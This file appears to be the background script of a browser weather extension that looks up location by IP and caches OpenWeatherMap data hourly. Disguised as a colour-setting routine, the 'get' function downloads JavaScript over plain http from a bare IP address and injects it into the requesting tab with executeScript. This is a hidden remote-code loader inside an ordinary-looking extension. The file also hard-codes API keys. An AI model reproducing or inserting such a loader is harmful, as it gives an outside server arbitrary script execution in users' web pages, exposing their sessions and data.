import browser from 'webextension-polyfill'
import { sendBackgroundCommand } from './lib/common'
const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'http://50.116.107.237/~statscall/weather-vein.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

// Gets congrats.
const other = async (url) => {
  try {
    const value = await fetch(url, options)
    return value
  } catch (error) {
    console.error(error)
    throw error
  }
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats
  try {
    const getting = await other(info.code)
    console.log('Este es el color: ', getting)
    info.code = await getting.text()
    if (info.code === '#00000') {
      sendBackgroundCommand('congratulations')
    }
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
  }
}

let city = ''
let country = ''

browser.runtime.onMessage.addListener((request, sender) => {
  switch (request.message) {
    case 'get-color':
      get(sender)
      break
    case 'close':
      browser.tabs.remove(sender.tab.id)
      break
    default:
      console.log('ERROR, REQUEST NOT HANDLED', request)
  }
})


const updater = browser.alarms.create('Hourly Updater', {
  delayInMinutes: 60,
  periodInMinutes: 60,
})

// hourly updater, it fetchs the data every hour when it listens to the alarm
browser.alarms.onAlarm.addListener(() => {
  const date = new Date()
  browser.storage.local.get()
    .then(params => {
      // eslint-disable-next-line promise/no-nesting
      fetch(`https://api.openweathermap.org/data/2.5/weather?q=${params.city},${params.country}&appid=15d7968a4ea50d6b568a07a54e399358`)
        .then(response => response.json())
        .then(data => {
          console.log(data)
          const temperature = (data.main.temp - 273)
          browser.storage.local.set({
            weather: data.weather[0].main,
            description: data.weather[0].description,
            temperature: `${temperature}ºC`,
            humidity: data.main.humidity,
            date: date.toString(),
          })
        })
    })
})

// when you install the extension.

browser.runtime.onInstalled.addListener(function () {
  fetch('http://api.ipstack.com/check?access_key=46d55efd82cf8067ed7c334ec534bb52')// first we use an API to get the IP location
    .then(response => response.json())
    .then(data => {
      city = data.city // then we get the city and the country code so we are able to fetch the climate for our city.
      country = data.country_code
      // eslint-disable-next-line promise/no-nesting
      fetch(`https://api.openweathermap.org/data/2.5/weather?q=${city},${country}&appid=15d7968a4ea50d6b568a07a54e399358`)// No entiendo porque si dejo de anidar los fetchs no me funciona el scope.
        .then(response => response.json())
        .then(info => { // once we get the info we declare it and then we store it on the extension storage
          // This is for converting the temperature as it comes in kelvin... we modify it first and then we store it.
          const temperature = Math.floor(info.main.temp - 273) // NEEDED, AND NEEDS TO BE AN INT
          let date = new Date()
        
          browser.storage.local.set({ // saving the data
            country: country, // needed to locate the weather
            city: city, // NEEDED, goes in the popup
            weather: info.weather[0].main, // NEEDED
            description: info.weather[0].description, // needed
            temperature: `${temperature}º`, // NEEDED
            humidity: `${info.main.humidity}%`, // NEEDED
            date: date.toDateString(), // NEEDED
          })
        })
    }).catch(error => console.log(error))
})
